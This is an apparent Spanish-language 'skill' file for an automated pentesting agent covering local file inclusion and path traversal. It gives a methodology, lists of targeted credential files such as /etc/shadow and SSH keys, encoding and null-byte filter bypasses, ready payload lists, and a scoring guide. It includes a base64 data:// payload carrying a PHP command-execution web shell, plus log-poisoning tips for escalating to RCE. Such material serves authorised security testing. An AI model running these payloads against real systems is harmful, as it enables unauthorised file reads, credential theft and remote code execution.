# SKILL: LOCAL FILE INCLUSION (LFI) / PATH TRAVERSAL

<!-- critical -->
LFI y Path Traversal permiten a un atacante leer archivos arbitrarios en el servidor. Puede llevar a la descarga de códigos fuente, archivos de configuración con credenciales (/etc/passwd, .env) y en algunos casos escalada a RCE.
<!-- /critical -->

## 1. SCOPE - Dónde Buscar

<!-- scope -->
- **Parámetros de archivos**: file=, page=, path=, doc=, image=, template=
- **Sube de archivos**: Nombres de archivos que se guardan en el servidor.
- **Cookies**: Parámetros de lenguaje o tema que cargan archivos (`lang=en`).
- **Headers**: X-Forwarded-For (si se usa para buscar logs).
<!-- /scope -->

## 2. METHODOLOGY

<!-- methodology -->
1. **IDENTIFY**: Inyectar secuencias de salto de directorio (`../`, `..\`) y observar si se accede a archivos fuera de la ruta esperada.
2. **HEURISTIC**: Intentar leer archivos estándar del sistema (`/etc/passwd`, `C:\Windows\win.ini`).
3. **WRAPPERS**: Si el archivo es PHP, probar wrappers (`php://filter`) para leer código fuente.
4. **LOG POISONING**: Si puedes leer archivos de logs (`/var/log/apache2/access.log`), inyectar código malicioso en el log para obtener RCE.
5. **BYPASS**: Si hay filtros, probar encoding (`%2e%2e%2f`), duplicación (`....//`) o null bytes (`%00`).
<!-- /methodology -->

## 3. KNOWLEDGE BASE

<!-- knowledge -->

### Standard Files to Target

- **Linux**: `/etc/passwd`, `/etc/shadow` (si es root), `/proc/self/environ`, `/var/www/html/config.php`, `~/.bash_history`.
- **Windows**: `C:\Windows\win.ini`, `C:\Windows\System32\drivers\etc\hosts`, `C:\Users\Administrator\.ssh\id_rsa`.

### PHP Wrappers

- **Read Source**: `php://filter/read=convert.base64-encode/resource=config.php`
- **Execute Code**: `data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+` (si allow_url_include=On).

### Common Bypasses

- **URL Encoding**: `../` -> `%2e%2e%2f`, `%252e%252e%252f` (Double encoding).
- **Unicode**: `..%c0%af`
- **Path Duplication**: `....//....//etc/passwd` (Si el filtro solo borra `../` una vez).
- **Null Byte**: `/etc/passwd%00` (Para evadir extensiones forzadas como `.php`).

<!-- /knowledge -->

## 4. SCORING GUIDE

<!-- scoring_guide -->

| Score | Criterio | Ejemplo |
| :--- | :--- | :--- |
| **9-10** | **CONFIRMED** - Lectura del archivo exitosa | El contenido de `/etc/passwd` o un archivo `.env` es visible |
| **7-8** | **HIGH** - Error revela ruta válida o existencia de archivo | `failed to open stream: No such file or directory in /var/www/...` |
| **5-6** | **MEDIUM** - Cambio en la respuesta al inyectar saltos | Página distinta pero sin contenido de archivo claro |
| **3-4** | **LOW** - Parámetro parece vulnerable pero está bloqueado | `id=file.txt` reacciona a `../` con un error de seguridad |
| **0-2** | **REJECT** - Falso positivo claro | El input se muestra como texto o no ocurre nada |

**AUTO-SCORING KEYWORDS:**

- 9-10: "root:x:0:0", "[boot loader]", "DB_PASSWORD", "PRIVATE KEY"
- 7-8: "failed to open stream", "include_path", "open_basedir restriction"
- 5-6: "result different", "file not found"
- 0-2: "EXPECTED: SAFE", "display only"

<!-- /scoring_guide -->

## 5. FALSE POSITIVES

<!-- false_positives -->

**RECHAZAR INMEDIATAMENTE:**

1. El nombre del archivo se refleja en la página pero no se lee su contenido.
2. El error de "archivo no encontrado" es generado por el browser (404 estándar).
3. "EXPECTED: SAFE" marcado explícitamente.
4. El salto de directorio ocurre en el lado del cliente (JS).

**NO SON FALSOS POSITIVOS:**

- Errores de "Permission denied" (Confirma que el archivo existe y el servidor intentó leerlo).
- La página tarda mucho más en cargar (Puede estar leyendo un archivo grande o log).
- El servidor devuelve un 403 solo al usar `../` (Confirma que hay un filtro detectando la intrusión).

<!-- /false_positives -->

## 6. PAYLOADS

<!-- payloads -->

### HIGH VALUE (LFI Linux/Windows)

```text
../../../../etc/passwd
..\..\..\..\windows\win.ini
../../../../etc/passwd%00
/etc/passwd
```

### MEDIUM VALUE (PHP Filters)

```text
php://filter/read=convert.base64-encode/resource=index.php
php://filter/resource=/etc/passwd
```

### BYPASS (Encoding/Duplication)

```text
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
....//....//....//etc/passwd
..%252f..%252f..%252fetc/passwd
```

<!-- /payloads -->

## 7. PRO TIPS

<!-- pro_tips -->
1. **Try /proc/self/environ**: Si puedes leerlo, puedes inyectar código en el `User-Agent` para obtener RCE vía LFI.
2. **Chain with SSRF**: A veces puedes usar wrappers como `expect://` o `http://` (si RFI está permitido) para escalar.
3. **Download binary files**: Si lees un binario, usa base64 encoding para no corromper la respuesta y poder analizarlo después.
<!-- /pro_tips -->
